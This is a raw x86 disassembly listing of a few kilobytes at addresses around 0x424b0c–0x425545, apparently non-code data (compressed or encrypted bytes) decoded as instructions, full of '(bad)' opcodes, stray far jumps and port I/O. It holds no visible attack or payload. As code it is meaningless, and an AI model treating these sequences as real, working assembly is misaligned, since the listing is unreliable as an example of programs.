  424b0c:	or     BYTE PTR [eax+0x7d],dl
  424b0f:	push   ecx
  424b10:	lods   eax,DWORD PTR ds:[esi]
  424b11:	call   0x228c:0x6fcfbfed
  424b18:	neg    DWORD PTR [edx]
  424b1a:	test   eax,0xd4171758
  424b1f:	jnp    0x424b3f
  424b21:	xchg   ebp,eax
  424b22:	inc    DWORD PTR [ebx-0x7a]
  424b25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424b26:	cs icebp 
  424b28:	ins    BYTE PTR es:[edi],dx
  424b29:	std    
  424b2a:	lds    ecx,FWORD PTR [edx]
  424b2c:	sub    eax,eax
  424b2e:	adc    ebx,ecx
  424b30:	push   0x26c5944e
  424b35:	stos   DWORD PTR es:[edi],eax
  424b36:	xchg   dh,bh
  424b38:	xchg   edi,eax
  424b39:	in     eax,dx
  424b3a:	push   0x75e7dd6e
  424b3f:	push   ebp
  424b40:	mov    esi,0xb9ce739f
  424b45:	in     eax,dx
  424b46:	sub    DWORD PTR [edx],0x9aabe066
  424b4c:	add    BYTE PTR ds:0xacd85f27,cl
  424b52:	ret    
  424b53:	and    dl,ch
  424b55:	sub    al,0x5e
  424b57:	loope  0x424b3d
  424b59:	lea    eax,[edi]
  424b5b:	out    0xb5,eax
  424b5d:	sbb    ecx,DWORD PTR [eax]
  424b5f:	inc    edi
  424b60:	(bad)  
  424b62:	jge    0x424bc8
  424b64:	sub    BYTE PTR [ecx],al
  424b66:	mov    edx,0xd73f1908
  424b6b:	(bad)  
  424b6c:	shr    BYTE PTR [eax+eax*1+0x0],cl
	...
  424bd3:	add    BYTE PTR [eax],al
  424bd5:	add    BYTE PTR [esi],al
  424bd7:	aas    
  424bd8:	or     eax,0xb6bb3db9
  424bdd:	mov    edi,0xdc50081e
  424be2:	inc    ebp
  424be3:	cs sbb edi,0x18a67
  424bea:	add    BYTE PTR [ecx],al
  424bec:	add    BYTE PTR [eax],al
  424bee:	sub    al,0x89
  424bf0:	mov    esi,gs
  424bf2:	ins    BYTE PTR es:[edi],dx
  424bf3:	bound  ecx,QWORD PTR [eax+0x60]
  424bf6:	inc    ebx
  424bf7:	inc    edi
  424bf8:	lods   al,BYTE PTR fs:[esi]
  424bfa:	retf   0x6017
  424bfd:	dec    esp
  424bfe:	shl    BYTE PTR [esi],1
  424c00:	adc    DWORD PTR [edi+edx*1+0x2e8fdc19],edi
  424c07:	sar    DWORD PTR [esi],1
  424c09:	push   es
  424c0a:	lea    ecx,[ebp+0x18]
  424c0d:	add    bl,dl
  424c0f:	push   es
  424c10:	cdq    
  424c11:	sbb    eax,0x7d741504
  424c16:	outs   dx,BYTE PTR ds:[esi]
  424c17:	jno    0x424c0a
  424c19:	pop    edx
  424c1a:	mov    dl,0x67
  424c1c:	in     al,dx
  424c1d:	inc    ecx
  424c1e:	loopne 0x424c42
  424c20:	mul    DWORD PTR [ebx+0x42]
  424c23:	cld    
  424c24:	or     DWORD PTR [edi-0x53],esi
  424c27:	test   eax,0x548bbe7b
  424c2c:	push   ebp
  424c2d:	xchg   esp,eax
  424c2e:	fistp  DWORD PTR fs:[ebx]
  424c31:	aaa    
  424c32:	int3   
  424c33:	mov    edx,0x5f3acea7
  424c38:	or     BYTE PTR [edx],ah
  424c3a:	push   ebx
  424c3b:	xlat   BYTE PTR ds:[ebx]
  424c3c:	sar    edi,1
  424c3e:	cli    
  424c3f:	or     al,0xda
  424c41:	ins    BYTE PTR es:[edi],dx
  424c42:	jne    0x424ca5
  424c44:	retf   
  424c45:	mov    esi,0xec04f24f
  424c4a:	sub    eax,DWORD PTR [eax-0x52bed967]
  424c50:	ss pop edi
  424c52:	mov    dh,0xff
  424c54:	or     bh,BYTE PTR [edi]
  424c56:	mov    ds:0x20fbb155,al
  424c5b:	rol    DWORD PTR [eax+0x2fd9cd36],1
  424c61:	leave  
  424c62:	sbb    edi,DWORD PTR [esi+0x40]
  424c65:	mov    BYTE PTR [ebx-0x7c],bl
  424c68:	icebp  
  424c69:	xchg   ecx,eax
  424c6a:	pop    eax
  424c6b:	fstp   DWORD PTR [ebx+0x5e0ed03a]
  424c71:	xor    eax,0xf2cca471
  424c76:	xchg   ecx,eax
  424c77:	aas    
  424c78:	mov    WORD PTR [eax-0x6a26716d],ss
  424c7e:	test   dl,cl
  424c80:	popa   
  424c81:	(bad)  
  424c83:	xchg   edx,eax
  424c84:	iret   
  424c85:	ret    0x76a1
  424c88:	xlat   BYTE PTR ds:[ebx]
  424c89:	xchg   edi,eax
  424c8a:	jle    0x424cee
  424c8c:	es nop
  424c8e:	jmp    0x36c7:0xb60b36dc
  424c95:	xbegin 0xfb948e04
  424c9b:	lea    ecx,[ebp+0x51ab5046]
  424ca1:	xchg   DWORD PTR [ebx],esp
  424ca3:	or     ebx,ecx
  424ca5:	sbb    dl,BYTE PTR [edx+0xfa231a8]
  424cab:	retf   0xe6a9
  424cae:	xchg   ebx,eax
  424caf:	mov    ah,0x9
  424cb1:	pop    esi
  424cb2:	push   0x59
  424cb4:	and    BYTE PTR [ebx+ebx*1-0x4cbef982],bh
  424cbb:	add    DWORD PTR [edx+0x51],esi
  424cbe:	(bad)  
  424cbf:	out    0xa0,al
  424cc1:	sbb    DWORD PTR [edi+ecx*1-0x6b],ebp
  424cc5:	sahf   
  424cc6:	rcr    BYTE PTR [ebx-0x2d6eb969],cl
  424ccc:	out    0x6e,eax
  424cce:	xchg   ecx,eax
  424ccf:	mov    bh,0xba
  424cd1:	push   0xffffff94
  424cd3:	(bad)  
  424cd4:	sub    eax,0x4be5f8e5
  424cd9:	shr    BYTE PTR [eax+edx*2+0xbc00d83],1
  424ce0:	(bad)  
  424ce1:	jb     0x424d01
  424ce3:	push   ebp
  424ce4:	sbb    ah,bl
  424ce6:	xchg   ecx,eax
  424ce7:	or     esi,DWORD PTR [eax]
  424ce9:	cmp    BYTE PTR [esi],dh
  424ceb:	pop    esi
  424cec:	ss pushf 
	...
  424d56:	ins    BYTE PTR es:[edi],dx
  424d57:	fidiv  DWORD PTR [edx+ebp*2-0x2101914a]
  424d5e:	bound  ebx,QWORD PTR [ebx+0x88e51a8]
  424d64:	or     al,0x43
  424d66:	mov    eax,DWORD PTR [bx+di]
  424d69:	add    BYTE PTR [eax],al
  424d6b:	add    DWORD PTR [eax],eax
  424d6d:	add    BYTE PTR [eax+ecx*2-0x19cc495c],dl
  424d74:	cwde   
  424d75:	and    ah,ah
  424d77:	sub    BYTE PTR [ecx],dl
  424d79:	fbstp  TBYTE PTR [ecx]
  424d7b:	mov    BYTE PTR [edx-0x8],dh
  424d7e:	cmp    DWORD PTR [edx+0x6b],edx
  424d81:	retf   0x5ecd
  424d84:	xor    cl,bh
  424d86:	sar    edx,1
  424d88:	shr    BYTE PTR [edx+0x72],cl
  424d8b:	and    eax,0xdeff8d59
  424d90:	std    
  424d91:	and    al,0x20
  424d93:	call   0x5ac:0x7ff49efa
  424d9a:	adc    eax,edx
  424d9c:	pushf  
  424d9d:	jae    0x424dc5
  424d9f:	and    al,0x5
  424da1:	push   ebp
  424da2:	scas   eax,DWORD PTR es:[edi]
  424da3:	int3   
  424da4:	inc    eax
  424da5:	fst    DWORD PTR [edi-0x3b]
  424da8:	lahf   
  424da9:	or     BYTE PTR [ecx],bl
  424dab:	mov    edx,0xde507f29
  424db0:	jae    0x424d6b
  424db2:	sbb    al,0xc6
  424db4:	inc    edi
  424db5:	out    0x2,al
  424db7:	mov    bl,al
  424db9:	jge    0x424d9a
  424dbb:	mov    bh,0x28
  424dbd:	lods   eax,DWORD PTR ds:[esi]
  424dbe:	inc    eax
  424dbf:	inc    ecx
  424dc0:	pop    edx
  424dc1:	sub    al,al
  424dc3:	jne    0x424dd6
  424dc5:	sub    ebx,DWORD PTR [esi]
  424dc7:	dec    esi
  424dc8:	push   esi
  424dc9:	xor    edi,DWORD PTR [esi]
  424dcb:	int    0x2a
  424dcd:	pop    edi
  424dce:	rcl    DWORD PTR [ebx],cl
  424dd0:	sbb    BYTE PTR [edi],ch
  424dd2:	jns    0x424de0
  424dd4:	mov    edi,0xed597cdd
  424dd9:	dec    edi
  424dda:	jbe    0x424e35
  424ddc:	push   ss
  424ddd:	cwde   
  424dde:	dec    edi
  424ddf:	adc    al,0x25
  424de1:	mov    cl,0x5b
  424de3:	imul   esp,DWORD PTR [edx+eiz*4+0x2f],0x8a048910
  424deb:	mov    ds:0x22083996,al
  424df0:	sbb    BYTE PTR [edi],dl
  424df2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424df4:	out    dx,al
  424df5:	cdq    
  424df6:	fcom   st(2)
  424df8:	xchg   ecx,eax
  424df9:	push   esp
  424dfa:	xor    al,0x61
  424dfc:	and    bh,BYTE PTR [edi+eiz*1+0x7ad466f3]
  424e03:	cs add eax,0xae84d5a
  424e09:	ins    DWORD PTR es:[edi],dx
  424e0a:	test   esi,ecx
  424e0c:	pop    edx
  424e0d:	fldenv [edi+edi*4+0x4f]
  424e11:	sub    eax,0x6bac2fe9
  424e16:	outs   dx,DWORD PTR ds:[esi]
  424e17:	rcl    DWORD PTR [ebp+0x1beeee17],0xee
  424e1e:	(bad)  
  424e1f:	mov    cl,0xbb
  424e21:	xor    DWORD PTR [ebx+0x341bf7c],edi
  424e27:	daa    
  424e28:	adc    eax,0xfa1a2d6b
  424e2d:	int3   
  424e2e:	jmp    0x534f:0x710994b4
  424e35:	inc    esi
  424e36:	loopne 0x424e9f
  424e38:	dec    edx
  424e39:	cwde   
  424e3a:	cmp    dh,BYTE PTR [edx]
  424e3c:	sbb    esi,DWORD PTR [edx+0x61]
  424e3f:	retf   0x7b45
  424e42:	push   edx
  424e43:	jno    0x424e83
  424e45:	(bad)  
  424e46:	push   edx
  424e47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424e48:	sub    al,0x1e
  424e4a:	mov    BYTE PTR [ebp-0x54175d64],dl
  424e50:	(bad)  
  424e51:	arpl   WORD PTR [edx],bp
  424e53:	pop    ss
  424e54:	in     al,0x2c
  424e56:	out    0xb,al
  424e58:	repnz add DWORD PTR [di-0x38],eax
  424e5d:	cmp    DWORD PTR [esi-0x3e],eax
  424e60:	xchg   BYTE PTR [ecx],al
  424e62:	test   DWORD PTR [ebp+0xc],0x74130477
  424e69:	sub    DWORD PTR [edx+0x9a87a3],esi
	...
  424ed3:	add    BYTE PTR [eax],al
  424ed5:	add    BYTE PTR ds:0xf361d20c,bh
  424edb:	(bad)  
  424edc:	mov    edi,0x4bceee5c
  424ee1:	jns    0x424f39
  424ee3:	sub    DWORD PTR [esi-0x3e],ecx
  424ee6:	mov    WORD PTR [bx+di],es
  424ee9:	add    BYTE PTR [eax],al
  424eeb:	add    DWORD PTR [eax],eax
  424eed:	add    BYTE PTR [ebx+0x503ea1df],cl
  424ef3:	xor    ch,BYTE PTR ds:0x2217c7c8
  424ef9:	dec    esi
  424efa:	inc    ebp
  424efb:	loope  0x424f11
  424efd:	enter  0xf747,0xdd
  424f01:	nop
  424f02:	xor    al,0x77
  424f04:	fcom   DWORD PTR [eax-0x29]
  424f07:	cli    
  424f08:	xor    edx,DWORD PTR [eax-0x2fcdcd95]
  424f0e:	clc    
  424f0f:	out    0xff,al
  424f11:	pop    edi
  424f12:	lds    edi,FWORD PTR [ebp+0x61]
  424f15:	xchg   esp,eax
  424f16:	adc    DWORD PTR [edi+ecx*8+0x6ffa61e0],ebx
  424f1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424f1e:	mov    dh,0x53
  424f20:	pop    eax
  424f21:	jns    0x424ecb
  424f23:	mul    BYTE PTR [ecx-0x5d8baea5]
  424f29:	sti    
  424f2a:	dec    BYTE PTR [esi+edx*8]
  424f2d:	push   0xc7aefedd
  424f32:	scas   eax,DWORD PTR es:[edi]
  424f33:	dec    esi
  424f34:	push   ss
  424f35:	shl    DWORD PTR ds:0x27902b8f,1
  424f3b:	or     al,0xa7
  424f3d:	pop    ds
  424f3e:	mov    BYTE PTR [edi+eiz*2-0x43498493],dl
  424f45:	mov    DWORD PTR [esi],ecx
  424f47:	fwait
  424f48:	inc    edi
  424f49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424f4a:	pop    ebx
  424f4b:	mov    dl,0xd4
  424f4d:	xchg   DWORD PTR [ebp-0x1f],edx
  424f50:	ror    BYTE PTR [ebx+ecx*4],1
  424f53:	adc    DWORD PTR [ecx+esi*1-0x356a69fe],0xdf5d328d
  424f5e:	ds scas eax,DWORD PTR es:[edi]
  424f60:	out    0x65,al
  424f62:	or     eax,0x88eff6c0
  424f67:	aaa    
  424f68:	lods   al,BYTE PTR ds:[esi]
  424f69:	pop    ecx
  424f6a:	ret    
  424f6b:	add    al,0xda
  424f6d:	out    dx,eax
  424f6e:	fisttp QWORD PTR [edx-0x6e97d3be]
  424f74:	loopne 0x424fa1
  424f76:	stos   BYTE PTR es:[edi],al
  424f77:	mov    ah,0xf3
  424f79:	test   eax,0xac11901b
  424f7e:	call   0x73486193
  424f83:	xchg   esi,eax
  424f84:	aaa    
  424f85:	cmp    al,0xfe
  424f87:	ins    DWORD PTR es:[edi],dx
  424f88:	sbb    bh,bl
  424f8a:	icebp  
  424f8b:	inc    edx
  424f8c:	and    DWORD PTR [esi],eax
  424f8e:	mov    BYTE PTR [edi+0x6f],ah
  424f91:	mov    DWORD PTR [edx],0x5cee98a7
  424f97:	aas    
  424f98:	cdq    
  424f99:	in     al,0xc
  424f9b:	jmp    0x42500a
  424f9d:	or     esp,edx
  424f9f:	push   ebp
  424fa0:	or     eax,0x5b19ec1f
  424fa5:	fwait
  424fa6:	or     DWORD PTR [ecx],edx
  424fa8:	lods   eax,DWORD PTR ds:[esi]
  424fa9:	push   ecx
  424faa:	or     BYTE PTR [esi+ecx*4+0x3d],bl
  424fae:	imul   ecx,DWORD PTR [eax+0x29c560c4],0xffffffce
  424fb5:	inc    esp
  424fb6:	pop    ss
  424fb7:	stc    
  424fb8:	aas    
  424fb9:	and    al,0xe6
  424fbb:	popf   
  424fbc:	mov    dh,0xcd
  424fbe:	inc    ebp
  424fbf:	pop    esi
  424fc0:	and    DWORD PTR [ebp+eiz*1-0x29cb0ba2],ebp
  424fc7:	xor    eax,0x29a21bd3
  424fcc:	daa    
  424fcd:	pusha  
  424fce:	xchg   ecx,eax
  424fcf:	mov    esi,0xd4d83041
  424fd4:	adc    BYTE PTR [eax-0xe],bl
  424fd7:	(bad)  
  424fd8:	clc    
  424fd9:	les    ebx,FWORD PTR [edx]
  424fdb:	addr16 std 
  424fdd:	repz cmp BYTE PTR [edx],cl
  424fe0:	daa    
  424fe1:	pop    esi
  424fe2:	adc    ch,bh
  424fe4:	push   0xffffffc1
  424fe6:	push   cs
  424fe7:	les    ebp,FWORD PTR [ebp+0x48]
  424fea:	hlt    
  424feb:	xchg   esp,eax
  424fec:	xchg   edx,eax
  424fed:	rol    BYTE PTR [eax],cl
	...
  425053:	add    BYTE PTR [eax],al
  425055:	add    BYTE PTR [ebx+0x16],cl
  425058:	int    0x41
  42505a:	fstp   st(3)
  42505c:	iret   
  42505d:	push   ds
  42505e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42505f:	fadd   st(3),st
  425061:	dec    eax
  425062:	mov    ds:0x6798d23b,al
  425067:	lea    eax,[ecx]
  425069:	add    BYTE PTR [eax],al
  42506b:	add    DWORD PTR [eax],eax
  42506d:	add    BYTE PTR [ecx],ah
  42506f:	cdq    
  425070:	inc    eax
  425071:	leave  
  425072:	mov    cl,0x45
  425074:	leave  
  425075:	pop    ebx
  425076:	int3   
  425077:	stc    
  425078:	push   0xe85d4fb9
  42507d:	sti    
  42507e:	jnp    0x425040
  425080:	or     dh,BYTE PTR [esi-0x295e2dbe]
  425086:	push   es
  425087:	leave  
  425088:	adc    al,0x6f
  42508a:	dec    esi
  42508b:	and    edx,DWORD PTR [eax-0x7c2cbe2c]
  425091:	fisttp QWORD PTR [esi-0x6d]
  425094:	cmp    dl,al
  425096:	ss push ebp
  425098:	add    ebp,ebp
  42509a:	test   BYTE PTR [edx+0x6a],cl
  42509d:	aaa    
  42509e:	xor    BYTE PTR [edi],al
  4250a0:	pop    ebp
  4250a1:	mov    ebx,0x460fad71
  4250a6:	out    0x58,al
  4250a8:	lds    ecx,FWORD PTR [eax+0x100110a6]
  4250ae:	or     edx,DWORD PTR [esi+0x7e]
  4250b1:	cmp    ch,BYTE PTR [esi-0x40]
  4250b4:	enter  0xabf4,0xea
  4250b8:	xor    ebx,eax
  4250ba:	and    DWORD PTR [edi],edi
  4250bc:	rcl    DWORD PTR [ebx],cl
  4250be:	test   BYTE PTR [ebx+0x5a],al
  4250c1:	jmp    0x425092
  4250c3:	ds xchg ecx,eax
  4250c5:	sbb    dh,BYTE PTR [eax]
  4250c7:	jne    0x4250bb
  4250c9:	push   ebp
  4250ca:	ins    BYTE PTR es:[edi],dx
  4250cb:	cmovo  eax,DWORD PTR [ebx+0x10]
  4250cf:	ja     0x4250de
  4250d1:	out    0x92,al
  4250d3:	call   edx
  4250d5:	pushf  
  4250d6:	daa    
  4250d7:	int    0xeb
  4250d9:	push   ebx
  4250da:	pop    ecx
  4250db:	cmp    DWORD PTR [ebx],ebx
  4250dd:	push   0x42
  4250df:	es clc 
  4250e1:	cwde   
  4250e2:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4250e4:	xor    dh,BYTE PTR [edx+0x5a3c46e3]
  4250ea:	push   ds
  4250eb:	mov    al,ds:0x3ceca828
  4250f0:	dec    edx
  4250f1:	xchg   ebx,eax
  4250f2:	xor    al,0x30
  4250f4:	push   es
  4250f5:	aaa    
  4250f6:	jno    0x42515e
  4250f8:	push   0xffffffec
  4250fa:	mov    eax,0x9a290cd2
  4250ff:	fbld   TBYTE PTR [edx-0x48646a3b]
  425105:	xor    bh,dl
  425107:	add    eax,0xf58b6950
  42510c:	push   ebx
  42510d:	sahf   
  42510e:	popa   
  42510f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425110:	xchg   edx,eax
  425111:	in     eax,0xc2
  425113:	repnz int3 
  425115:	add    ah,cl
  425117:	mov    ds:0x86cb09b0,al
  42511c:	and    eax,0xd1b82b68
  425121:	aas    
  425122:	or     ah,BYTE PTR [esi+0x5cc59c2f]
  425128:	les    ecx,FWORD PTR [edi]
  42512a:	mov    ch,0x51
  42512c:	sbb    ah,cl
  42512e:	in     eax,dx
  42512f:	in     al,0x20
  425131:	mov    ?,WORD PTR [edx]
  425133:	push   0x172bf707
  425138:	push   esp
  425139:	sub    bh,BYTE PTR [ecx]
  42513b:	adc    bh,bl
  42513d:	jle    0x4250e2
  42513f:	in     al,0xcb
  425141:	jne    0x42514d
  425143:	push   eax
  425144:	lds    ecx,FWORD PTR [eax]
  425146:	cld    
  425147:	fst    DWORD PTR [ebp+0x57ee31d9]
  42514d:	add    BYTE PTR [eax],al
  42514f:	scas   al,BYTE PTR es:[edi]
  425150:	pop    edi
  425151:	xchg   esp,eax
  425152:	pusha  
  425153:	pop    esp
  425154:	scas   al,BYTE PTR es:[edi]
  425155:	mov    bl,0x93
  425157:	jae    0x4250f8
  425159:	ror    DWORD PTR [ebx],cl
  42515b:	cmp    al,0x12
  42515d:	jle    0x4251b8
  42515f:	sbb    DWORD PTR [edi+edi*2-0xd599bba],ebx
  425166:	fsub   st,st(0)
  425168:	xor    al,dh
  42516a:	outs   dx,BYTE PTR ds:[esi]
  42516b:	daa    
  42516c:	(bad)  
  42516d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
	...
  4251d6:	ficom  WORD PTR [ecx]
  4251d8:	lahf   
  4251d9:	and    ebx,edi
  4251db:	scas   eax,DWORD PTR es:[edi]
  4251dc:	(bad)  
  4251dd:	std    
  4251de:	out    dx,al
  4251df:	jmp    0xbfac:0x96a592e8
  4251e6:	mov    es,WORD PTR [bx+di]
  4251e9:	add    BYTE PTR [eax],al
  4251eb:	add    DWORD PTR [eax],eax
  4251ed:	add    BYTE PTR [edi],dh
  4251ef:	shl    edi,cl
  4251f1:	lahf   
  4251f2:	adc    BYTE PTR [edx+0xc6adfda],bh
  4251f8:	out    dx,eax
  4251f9:	fwait
  4251fa:	mov    dl,0xf5
  4251fc:	lock push edx
  4251fe:	inc    ebx
  4251ff:	add    BYTE PTR [ebx+edi*1],bh
  425202:	(bad)  
  425203:	adc    esi,DWORD PTR [edx]
  425205:	pop    ecx
  425206:	in     al,0x45
  425208:	in     eax,dx
  425209:	in     eax,dx
  42520a:	adc    DWORD PTR [ebx+0x76],0xd8a3fba8
  425211:	push   cs
  425212:	das    
  425213:	sbb    edx,DWORD PTR [edx+ecx*1+0x4b]
  425217:	xchg   edx,eax
  425218:	mov    ah,0x27
  42521a:	test   BYTE PTR [esi+0x71],bl
  42521d:	(bad)  
  42521e:	not    DWORD PTR [edi-0x7f62b35b]
  425224:	xchg   BYTE PTR [eax-0x5c3c4941],cl
  42522a:	mov    bl,0x6f
  42522c:	getsec 
  42522e:	cmc    
  42522f:	adc    bl,BYTE PTR [eax-0x6f115d4e]
  425235:	cwde   
  425236:	cmp    esp,DWORD PTR [ebp+0x6c]
  425239:	stos   BYTE PTR es:[edi],al
  42523a:	mov    ecx,0xe1636231
  42523f:	xor    al,0x9
  425241:	jno    0x425217
  425243:	xchg   edi,eax
  425244:	jg     0x425283
  425246:	dec    esp
  425247:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425248:	or     eax,0x5d114dae
  42524d:	ret    0xa719
  425250:	(bad)  
  425251:	adc    al,0x70
  425253:	ret    0xfa4e
  425256:	leave  
  425257:	je     0x42522e
  425259:	scas   al,BYTE PTR es:[edi]
  42525a:	loop   0x4252da
  42525c:	push   ebp
  42525d:	bound  esi,QWORD PTR [ebx+0x4f]
  425260:	gs xchg esi,eax
  425262:	mov    DWORD PTR [ebp+0x9f6fb43],ebp
  425268:	dec    ecx
  425269:	shl    BYTE PTR [esi+ebp*2+0x6d646914],cl
  425270:	sub    eax,0x94714f64
  425275:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425276:	cmp    ch,BYTE PTR [ecx]
  425278:	mov    ds:0xe01c3b3e,eax
  42527d:	or     al,BYTE PTR [esi+0x2474919b]
  425283:	xchg   ecx,eax
  425284:	inc    esi
  425285:	cmp    dh,BYTE PTR [eax-0x5211e47a]
  42528b:	mov    eax,0x78ef667f
  425290:	sub    ah,dh
  425292:	cmp    BYTE PTR fs:[edx-0x50],dl
  425296:	sbb    esp,DWORD PTR [edi-0x4d]
  425299:	in     al,dx
  42529a:	in     al,0xe8
  42529c:	lods   eax,DWORD PTR ds:[esi]
  42529d:	mov    ds:0xb84f4faa,eax
  4252a2:	or     DWORD PTR [ebp+0x5b],ebp
  4252a5:	lds    ebx,FWORD PTR [ecx-0x5de36e0d]
  4252ab:	je     0x42531a
  4252ad:	repnz adc BYTE PTR [ebx-0xb],cl
  4252b1:	xchg   ecx,eax
  4252b2:	adc    eax,0x3269a4f0
  4252b7:	popf   
  4252b8:	scas   eax,DWORD PTR es:[edi]
  4252b9:	out    dx,eax
  4252ba:	ins    BYTE PTR es:[edi],dx
  4252bb:	xor    BYTE PTR [esi],0x51
  4252be:	and    ebx,DWORD PTR [ebx+ebx*4-0x35]
  4252c2:	ins    DWORD PTR es:[edi],dx
  4252c3:	mov    ch,BYTE PTR [edx]
  4252c5:	daa    
  4252c6:	add    ah,bh
  4252c8:	std    
  4252c9:	adc    eax,0x9ecc8fdb
  4252ce:	cdq    
  4252cf:	test   DWORD PTR [esi],ecx
  4252d1:	les    ecx,FWORD PTR [esi-0x325f71e5]
  4252d7:	test   eax,0xa8e273d5
  4252dc:	or     edi,DWORD PTR cs:[edi+0x23b14411]
  4252e3:	data16 aas 
  4252e5:	sbb    cl,BYTE PTR [ebp+0x6]
  4252e8:	push   0xfffffff8
  4252ea:	and    esi,DWORD PTR [eax+ebx*2+0x96]
	...
  425355:	add    BYTE PTR [esp+eax*8-0x84318d],ch
  42535c:	mov    ebp,0x45495ee6
  425361:	icebp  
  425362:	imul   edi,esp,0x1e
  425365:	jo     0x4253ce
  425367:	pop    DWORD PTR [ecx]
  425369:	add    BYTE PTR [eax],al
  42536b:	add    DWORD PTR [eax],eax
  42536d:	add    BYTE PTR [esp+eiz*2],bh
  425370:	fidivr WORD PTR [edi-0xdfab7b7]
  425376:	push   esp
  425377:	js     0x4253dc
  425379:	je     0x425383
  42537b:	adc    ebx,DWORD PTR [esi+0x6b]
  42537e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42537f:	js     0x425357
  425381:	dec    esi
  425382:	inc    ebx
  425383:	push   ss
  425384:	mov    al,0xf1
  425386:	add    BYTE PTR [esp+eiz*2],0x5f
  42538a:	imul   esi,DWORD PTR [edi],0xffffff85
  42538d:	jle    0x42532e
  42538f:	mov    ebx,0x4fdcc8ef
  425394:	cli    
  425395:	sbb    al,0x49
  425397:	add    al,0x12
  425399:	(bad)  
  42539a:	jl     0x4253f7
  42539c:	adc    DWORD PTR [eax+0x1],ebx
  42539f:	jno    0x4253f4
  4253a1:	pop    ebx
  4253a2:	sahf   
  4253a3:	add    bh,ah
  4253a5:	sar    BYTE PTR [ecx+0x2e],0xda
  4253a9:	add    ch,dl
  4253ab:	mov    dh,0x59
  4253ad:	cld    
  4253ae:	div    ebx
  4253b0:	ins    BYTE PTR es:[edi],dx
  4253b1:	jmp    0x425395
  4253b3:	push   edi
  4253b4:	xor    al,0xe3
  4253b6:	dec    eax
  4253b7:	js     0x425369
  4253b9:	imul   esp,DWORD PTR [esi+0x50],0xfdc94fa6
  4253c0:	xor    BYTE PTR [edx+0x36595936],dl
  4253c6:	stos   BYTE PTR es:[edi],al
  4253c7:	cmp    eax,0x704aac9e
  4253cc:	cmp    ecx,DWORD PTR [ebx+0x3bba8d8c]
  4253d2:	jmp    0xbff5b9bb
  4253d7:	xlat   BYTE PTR ds:[ebx]
  4253d8:	test   DWORD PTR [ebp-0x2],ebp
  4253db:	mov    esp,0x4226b770
  4253e0:	out    0x66,eax
  4253e2:	ret    
  4253e3:	and    esi,DWORD PTR [edi+ecx*1]
  4253e6:	popf   
  4253e7:	repz in eax,0xef
  4253ea:	inc    eax
  4253eb:	out    0x9c,al
  4253ed:	leave  
  4253ee:	scas   eax,DWORD PTR es:[edi]
  4253ef:	cdq    
  4253f0:	dec    edi
  4253f1:	cld    
  4253f2:	imul   ebx,DWORD PTR ds:0xfe98b34d,0x32
  4253f9:	mov    ecx,0xd5abdbfe
  4253fe:	dec    edx
  4253ff:	cli    
  425400:	xor    eax,0x2ae32bf7
  425405:	mov    ebx,0x77bc0449
  42540a:	xor    esi,edx
  42540c:	ds cwde 
  42540e:	stc    
  42540f:	inc    ebx
  425410:	std    
  425411:	mov    ch,0x2f
  425413:	xchg   BYTE PTR [ebp-0x3c],al
  425416:	push   cs
  425417:	je     0x425417
  425419:	es mov bh,0x2d
  42541c:	clc    
  42541d:	xchg   ecx,eax
  42541e:	rcl    DWORD PTR [edi+0x2b0b9673],cl
  425424:	ins    DWORD PTR es:[edi],dx
  425425:	cmp    ah,BYTE PTR [edx]
  425427:	xor    eax,0x50a7315b
  42542c:	stos   DWORD PTR es:[edi],eax
  42542d:	push   ds
  42542e:	cmp    al,0x9b
  425430:	mov    ecx,0x4791e042
  425435:	jb     0x4253b9
  425437:	mov    dh,0x85
  425439:	es xor dh,dh
  42543c:	push   es
  42543d:	jbe    0x4254ad
  42543f:	pop    esi
  425440:	jmp    0xdeba:0x5c5e834a
  425447:	sbb    BYTE PTR [esi],bl
  425449:	xchg   dh,cl
  42544b:	adc    eax,0x89ebd313
  425450:	(bad)  
  425451:	mov    dh,0xdb
  425453:	pop    edx
  425454:	in     al,dx
  425455:	js     0x4253f1
  425457:	lods   eax,DWORD PTR ds:[esi]
  425458:	cmp    BYTE PTR [edi-0x54f66ab5],cl
  42545e:	add    DWORD PTR [edi+0x3e58770a],esi
  425464:	xchg   ebx,eax
  425465:	dec    esi
  425466:	aad    0x6f
  425468:	mov    ds:0x68011fe4,eax
  42546d:	das    
	...
  4254d6:	inc    edx
  4254d7:	or     esp,eax
  4254d9:	test   eax,0xeb6fedcf
  4254de:	fcomp  DWORD PTR [edx]
  4254e1:	add    edi,DWORD PTR [eax+0x6751ea87]
  4254e7:	nop
  4254e8:	add    DWORD PTR [eax],eax
  4254ea:	add    BYTE PTR [ecx],al
  4254ec:	add    BYTE PTR [eax],al
  4254ee:	and    eax,0x81533803
  4254f3:	call   0xe30:0xca339d81
  4254fa:	mov    eax,0x2fc444e
  4254ff:	(bad)  
  425500:	(bad)  
  425501:	jns    0x4254d2
  425503:	sbb    BYTE PTR [ebx-0x208aab00],bh
  425509:	arpl   WORD PTR [eax],di
  42550b:	dec    ebx
  42550c:	ja     0x42550f
  42550e:	mov    bh,0xab
  425510:	xchg   edx,eax
  425511:	ror    BYTE PTR [esi-0x4692aafb],0xb4
  425518:	sti    
  425519:	dec    ebp
  42551a:	sub    al,0xcc
  42551c:	scas   eax,DWORD PTR es:[edi]
  42551d:	mov    edi,0x65bc0989
  425522:	xor    BYTE PTR [esi],al
  425524:	adc    ah,BYTE PTR [eax+0x7]
  425527:	mov    ?,ebp
  425529:	or     BYTE PTR [edi+0x73488d4],ah
  42552f:	xchg   esp,eax
  425530:	jp     0x425533
  425532:	je     0x4254d2
  425534:	es xchg esi,eax
  425536:	in     al,dx
  425537:	ret    
  425538:	out    dx,al
  425539:	scas   eax,DWORD PTR es:[edi]
  42553a:	ja     0x4254ed
  42553c:	sub    eax,0x38e7be5b
  425541:	les    ecx,FWORD PTR [edx]
  425543:	mov    dh,0x46
  425545:	add    al,0x58
